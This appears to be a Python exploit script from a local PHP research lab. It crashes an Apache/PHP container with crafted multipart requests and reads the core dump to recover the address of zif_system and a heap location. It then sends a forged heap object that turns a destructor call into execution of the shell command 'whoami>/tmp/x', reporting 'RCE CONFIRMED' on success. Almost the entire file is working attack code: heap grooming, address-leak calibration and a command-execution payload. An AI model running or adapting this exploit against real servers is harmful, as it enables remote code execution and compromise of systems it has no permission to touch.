#!/usr/bin/env python3
"""oom71B: v2 aimed RCE attempt (clean build).

Stage A: calibration crash (marker fat values, same envelope) -> per-boot:
    sys_addr = rip - 0x49be7b + 0x39b8a0   (&zif_system)
    P        = VA of the first marker value string in the heap segment
Stage B (same boot): build_attack(3400, ..., value_tile=chooser)
    chooser: every 128th part carries the 400B super-tile (repeated to
    1537B with pad), others carry aim_tile = P8 repeated.
    Value strings land at the SAME VAs as stage A (identical sizes/order),
    so the super-tile copy at the first super-part's value start sits at
    that value's VA. We aim the walk at the FIRST SUPER VALUE's VA (P_sup),
    computed as P + (index of first super part) * stride... -- NO: strides
    are not uniform (poison parts sit between). Instead: aim = VA of the
    first value that carries the super tile = P (part 0 IS a super part).
    Walk reads P -> refcount-1 -> 0 -> rc_dtor_func(P) -> store_del:
      flags say DESTRUCTOR_CALLED (skip ce) -> refcount==0 ->
      handle=1 bucket write -> FREE_CALLED not set -> free_obj(P) =
      zif_system(P): arg zval @P+80 = {P+104,12} -> zend_string @P+104
      = "whoami>/tmp/x" -> execve sh -c -> whoami > /tmp/x.
Success: /tmp/x appears in php_vuln. Diagnostics otherwise: core rdi.
"""
import subprocess, sys, time, struct, re

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
MMT = b"MM\x01\x02\x03\x04\x05\x06" * 2
CMD = b"whoami>/tmp/x"
K1 = P.K1S[-2] if hasattr(P, "K1S") else 3300


def sh(c, t=90):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c_%s && docker cp /tmp/c_%s phpbuild:/tmp/c_%s" % (tag, tag, tag), 240)
    return sh("docker exec phpbuild sh -c 'gdb -q -batch "
              "-ex \"info registers rdi rip rsi\" /tmp/libphp.69.so /tmp/c_%s'" % tag, 240)


def parse_core(out, tag):
    rdi = int(re.search(r"rdi\s+0x([0-9a-f]+)", out).group(1), 16)
    rip = int(re.search(r"rip\s+0x([0-9a-f]+)", out).group(1), 16)
    rsi = int(re.search(r"rsi\s+0x([0-9a-f]+)", out).group(1), 16)
    sh("docker cp phpbuild:/tmp/c_%s /tmp/core_%s_host" % (tag, tag), 240)
    data = open("/tmp/core_%s_host" % tag, "rb").read()
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    phent = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    seg = None
    for i in range(e_phnum):
        o = e_phoff + i * phent
        t = struct.unpack_from("<I", data, o)[0]
        off_, va, pa, fsz, msz = struct.unpack_from("<QQQQQ", data, o + 8)
        if t == 1 and fsz > 0 and va <= rsi < va + fsz:
            seg = (va, off_, fsz)
    assert seg, "no PT_LOAD contains rsi"
    hva, hoff, hsz = seg
    heap = data[hoff:hoff + hsz]
    mi = heap.find(MMT * 8)
    return rdi, rip, rsi, (hva + mi if mi >= 0 else None)


def build_sup(sys_addr, P_va):
    """400B super-tile with absolute pointers; copy0 starts at P_va."""
    obj = struct.pack("<IIIIQQ", 1, 0x108, 1, 0, 0, P_va + 32)
    htab = struct.pack("<QQQQ", 0, sys_addr, 0, 0)
    fpad = b"\x00" * 16                      # +64..80
    argz = struct.pack("<QII", P_va + 104, len(CMD), 0)  # +80..96
    gs = struct.pack("<II", 1, len(CMD)) + CMD + b"\x00"  # +104..120
    gs += b"\x00" * (40 - len(gs))           # +104..144
    block = obj + htab + fpad + argz + gs    # 144B
    block += b"\x00" * (200 - len(block))    # pad copy to 200B
    return block * 2                         # 400B


def value_from(tile):
    reps = 1537 // len(tile)
    v = tile * reps
    return v + b"P" * (1537 - len(v))


print("[0] boot + core env", flush=True)
boot_core_env()

print("[1] STAGE A: warm + calibration crash", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=MMT))
code, body = post(P.build_attack(3400, 9200000, value_tile=MMT))
print("  marker fire: %s %r" % (code, body[:50]), flush=True)
if code == "200":
    print("  no crash — geometry drift; stop", flush=True)
    sys.exit(1)
time.sleep(3)
out = fetch_core("A")
print(out[-400:], flush=True)
rdi, rip, rsi, P_addr = parse_core(out, "A")
sys_addr = rip - 0x49be7b + 0x39b8a0
print("[A] marker VA = 0x%x, &zif_system = 0x%x" % (P_addr, sys_addr), flush=True)
assert P_addr, "marker not found in core"

print("[2] STAGE B: weaponized body (same envelope)", flush=True)
SUP = build_sup(sys_addr, P_addr)
AT = struct.pack("<Q", P_addr) * 2
chooser = lambda i: (SUP if i % 128 == 0 else AT)
wb = P.build_attack(3400, 9300000, value_tile=chooser)
ref = P.build_attack(3400, 9300000)
print("  sizes: weaponized=%d proven=%d identical=%s" % (len(wb), len(ref), len(wb) == len(ref)), flush=True)
assert len(wb) == len(ref)

print("[3] aimed fires (first post-sacrifice fire is the survivor slot — loop)", flush=True)
for fi in range(4):
    code, resp = post(wb)
    print("  fire%d: %s %r" % (fi, code, resp[:100]), flush=True)
    time.sleep(2)
    chk = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    if "No such" not in chk:
        print("  /tmp/x: [%s]" % chk, flush=True)
        print("*** RCE CONFIRMED on fire %d ***" % fi, flush=True)
        break
    print("  /tmp/x: not yet (%s)" % chk.splitlines()[0][:60], flush=True)
    if code != "200":
        out2 = fetch_core("B%d" % fi)
        m = re.search(r"rdi\s+0x([0-9a-f]+)", out2)
        mrip = re.search(r"rip\s+0x([0-9a-f]+)", out2)
        print("  crash: rip=%s rdi=0x%s" % (mrip.group(1) if mrip else "?", m.group(1) if m else "?"), flush=True)
        if m:
            rb = struct.pack("<Q", int(m.group(1), 16))
            print("  rdi bytes: %s (want %s)" % (rb.hex(), struct.pack("<Q", P_addr).hex()), flush=True)

print("[4] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
